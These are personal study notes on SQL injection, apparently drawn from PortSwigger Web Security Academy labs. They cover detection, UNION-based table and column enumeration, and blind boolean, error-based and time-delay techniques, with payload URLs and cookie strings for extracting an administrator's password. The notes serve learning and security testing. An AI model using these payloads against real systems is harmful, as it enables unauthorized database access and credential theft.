# SQL Injection

{% hint style="info" %}
The "Web Hacking" section are notes that I have compiled while learning using the PortSwigger Web Security Academy and from the book _Bug Bounty Bootcamp: The Guide to Finding and Reporting Web Vulnerabilities_ by Vickie Li. A majority of the notes/codes are from them, however I will modify these according to my needs.
{% endhint %}

### How to detect SQL injection vulnerabilities <a href="#how-to-detect-sql-injection-vulnerabilities" id="how-to-detect-sql-injection-vulnerabilities"></a>

* Submitting the single quote character `'` and looking for errors or other anomalies.
* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
* Submitting Boolean conditions such as `OR 1=1` and `OR 1=2, and` looking for differences in the application's responses.
* Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
* Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.

### Database-specific factors <a href="#database-specific-factors" id="database-specific-factors"></a>

* Syntax for string concatenation.
* Comments.
* Batched (or stacked) queries.
* Platform-specific APIs.
* Error messages.

### SQL injection in different parts of the query <a href="#sql-injection-in-different-parts-of-the-query" id="sql-injection-in-different-parts-of-the-query"></a>

* In `UPDATE` statements, within the updated values or the `WHERE` clause.
* In `INSERT` statements, within the inserted values.
* In `SELECT` statements, within the table or column name.
* In `SELECT` statements, within the `ORDER BY` clause.

### **Retrieving hidden data**

Regular:&#x20;

`https://insecure-website.com/products?category=Gifts`

Modified:

`https://insecure-website.com/products?category=Gifts'--`

**OR**

`https://insecure-website.com/products?category=Gifts'+OR+1=1--`

### **Subverting application logic**

Regular:

`SELECT * FROM users WHERE username = 'John' AND password = 'Doe'`

Modified:

`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`` `**`//username = administrator'-- | password = <empty string>`**&#x20;

**`//username = administrator'-- - #also works`**

### **SQL injection UNION attacks**

For a `UNION` query to work, two key requirements must be met:

* The individual queries must return the same number of columns.
* The data types in each column must be compatible between the individual queries.

To determine the number of columns required (to be submitted within the `WHERE` clause of the original query):

`' ORDER BY 1--`&#x20;

`' ORDER BY 2--`&#x20;

`' ORDER BY 3--`&#x20;

`.....`

**OR**

`' UNION SELECT NULL--`&#x20;

`' UNION SELECT NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL--`

`.....`

If you get an error for either one and then you'll know how many columns there are.

Regular:

`https://acad1f5f1ebf0bbfc0bd07d0009f009f.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories`

Modified:

`https://acad1f5f1ebf0bbfc0bd07d0009f009f.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27%20UNION%20SELECT%20NULL,NULL,NULL--`

### **Finding columns with a useful data type in an SQL injection UNION attack**

**Replace 'a' with string you are looking for:**

`' UNION SELECT 'a',NULL,NULL,NULL--`&#x20;

`' UNION SELECT NULL,'a',NULL,NULL--`&#x20;

`' UNION SELECT NULL,NULL,'a',NULL--`&#x20;

`' UNION SELECT NULL,NULL,NULL,'a'--`

Regular:

`https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories`

Modified:

`https://ac1f1f361f395e87c021394c00230079.web-security-academy.net/filter?category=Accessories%27%20UNION%20SELECT%20NULL,%27FgYUb0%27,NULL--`

### Using an SQL injection UNION attack to retrieve interesting data <a href="#using-an-sql-injection-union-attack-to-retrieve-interesting-data" id="using-an-sql-injection-union-attack-to-retrieve-interesting-data"></a>

The crucial information needed to perform this attack is that there is a table called `users` with two columns called `username` and `password`

`' UNION SELECT username, password FROM users--`

Regular:

`https://ac401f231f831ad7c0283c9800910099.web-security-academy.net/filter?category=Accessories`

Modified:

`ac401f231f831ad7c0283c9800910099.web-security-academy.net/filter?category=Accessories' UNION SELECT username, password FROM users--`

### Retrieving multiple values within a single column <a href="#retrieving-multiple-values-within-a-single-column" id="retrieving-multiple-values-within-a-single-column"></a>

This example is for Oracle DBs:

`' UNION SELECT username || '~' || password FROM users--`

Tip: use the comma to combine two queries&#x20;

Regular:

`https://ac791f681f4f06c8c0f90ed300ca0036.web-security-academy.net/filter?category=Gifts`

Modified:

`https://ac791f681f4f06c8c0f90ed300ca0036.web-security-academy.net/filter?category=Gifts%27%20UNION%20SELECT%20NULL,username%20||%20%27~%27%20||%20password%20FROM%20users--`

### Querying the database type and version <a href="#querying-the-database-type-and-version" id="querying-the-database-type-and-version"></a>

| Database Type    | Query                     |
| ---------------- | ------------------------- |
| Microsoft, MySQL | `SELECT @@version`        |
| Oracle           | `SELECT * FROM v$version` |
| PostgreSQL       | `SELECT version()`        |

For example, you could use a `UNION` attack with the following input:

`' UNION SELECT @@version--`

Regular:

`https://ac0b1f1d1f62d851c04a61770014009b.web-security-academy.net/filter?category=Gifts`

Modified:

`https://ac0b1f1d1f62d851c04a61770014009b.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+BANNER,+NULL+FROM+v$version--`

### Listing the database contents on non-Oracle databases

Regular:

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts`

Modified:

See all available tables:

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--`

Find the table that you are interested in. Then change the following query with the table (mine was "users\_ddvsxa"):

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=%27users_ddvsxa%27--`

Find the names of the columns containing what you are looking for (usernames/passwords). For me, it was **username\_czehbi** and **password\_jwcmoz** Then modify the following query:

`https://ac021f0e1ff14420c0f12314002b00a4.web-security-academy.net/filter?category=Corporate+gifts%27+UNION+SELECT+username_czehbi,+password_jwcmoz+FROM+users_ddvsxa--`

### Equivalent to information schema on Oracle <a href="#equivalent-to-information-schema-on-oracle" id="equivalent-to-information-schema-on-oracle"></a>

You can list tables by querying `all_tables`:

`SELECT * FROM all_tables`

And you can list columns by querying `all_tab_columns`:

`SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

### Blind SQL injection by triggering conditional responses

Use `AND` to check if condition is inject-able:

`…xyz' AND '1'='1 //True`

`…xyz' AND '1'='2 //False`

Based off the True and False above, you then give statements to test out what is available. To verify if there is a table called **users**, you would do the following:

`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users LIMIT 1)='a;`

Now you know the **users** table exists, if you get a similar response to True above. To check for a username, you would run the following:

`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users WHERE username='administrator')='a;`

This checks if the username is **administrator**, and if this is true, then you will get the same response as you did for True above.&#x20;

Determine size of **password** value:

`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`` `**`//(password)=1) also works`**

Determine password string (use with Burp Suite Intruder):

`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`

Modified Cookie with Intruder:

`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§;`

{% hint style="info" %}
Use a wordlist of \[A-Za-z0-9] (special characters as well)
{% endhint %}

To find second character:

`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§;`

You'll know when you are hitting the mark when you see a Length difference in Burp Suite, or the same response as the True response:

![](<../.gitbook/assets/image (331) (1) (1) (1) (1) (1).png>)

Eventually, you will have the whole string.

### Inducing conditional responses by triggering SQL errors <a href="#inducing-conditional-responses-by-triggering-sql-errors" id="inducing-conditional-responses-by-triggering-sql-errors"></a>

This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.

`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`` `**`// = 'a'`**

`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`` `**`// = 1/0 error`**

Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.

`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`

To test for vulnerability:

`Cookie: TrackingId=jtQxp6BAmmb6pemr'`

`Cookie: TrackingId=jtQxp6BAmmb6pemr''`

If the error disappears you have a **syntax error**.

To confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error:

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '')||'`

To test for Oracle databases:

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM dual)||'`

If you do not get an error with the above query, then the DB is Oracle. To make sure SQL query is being processed in the backend, run the following:

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM not-a-real-table)||'`

To verify that a users table exists:

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`

To test conditions:

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' //should give error`

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' //should NOT give error`

{% hint style="info" %}
We get an error when the conditional is True
{% endhint %}

Check for a username (will result in an error if true):

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Size of password:

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`` `**`//LENGTH(password)=20 works as well`**

Check for character at specific location (for BurpSuite Intruder):

`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

Again, for this one the error lets you know when you are on the right path:

![](<../.gitbook/assets/image (339) (1) (1) (1) (1) (1) (1) (1) (1).png>)

### Exploiting blind SQL injection by triggering time delays <a href="#exploiting-blind-sql-injection-by-triggering-time-delays" id="exploiting-blind-sql-injection-by-triggering-time-delays"></a>

This method is for when the application catches database errors and handles them. The previous example will not work, since we will not get a notification of the error. The following examples are for Microsoft SQL Database:

`'; IF (1=2) WAITFOR DELAY '0:0:10'-- //no delay, since it's FALSE`\
`'; IF (1=1) WAITFOR DELAY '0:0:10'-- //delay, since it is TRUE`

Example:

`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`

Use Case:

`Cookie: TrackingId=IlAzXVbrp933YGHp'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--;`

For PostgreSQL:

If you use ";", you get an error, but if it is encoded, then you are allowed to query. The following query does NOT work:

`Cookie: TrackingId=O6fRvnQwwVzqOXwY';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;`

This one does:

`Cookie: TrackingId=O6fRvnQwwVzqOXwY'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;`

PostgreSQL find size of password (assuming there is a password column):

`Cookie: TrackingId=O6fRvnQwwVzqOXwY'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
